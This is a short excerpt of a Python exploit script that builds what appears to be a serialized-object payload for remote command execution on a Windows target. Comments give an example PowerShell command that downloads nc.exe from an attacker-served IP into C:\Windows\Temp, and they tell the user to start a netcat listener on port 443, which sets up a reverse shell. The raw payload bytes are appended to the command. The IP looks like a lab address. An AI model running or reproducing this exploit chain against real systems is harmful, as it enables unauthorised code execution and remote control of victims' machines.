...
# Usage: Simply paste your payload into the `cmd` variable. See example below
...
def createpayload():
    #payload = open("payload.bin", 'rb').read() <<< No longer necessary

    # Example Usage below. Simply uncomment the two relevant lines below, and serve your nc.exe via python server. Then execute python exploit.
    # cmd = "cmd /c powershell IWR -uri http://10.10.14.8/nc.exe -OutFile C:\\Windows\\Temp\\nc.exe"
    # Now setup your listener `sudo rlwrap nc -nlvp 443` for example. Then execute python exploit.
    ...
    payload += cmd.encode()
    payload += b'\x74\x00\x04\x65\x78\x65\x63\x75\x71\x00\x7e\x00\x2f\x00\x00\x00\x01\x71'
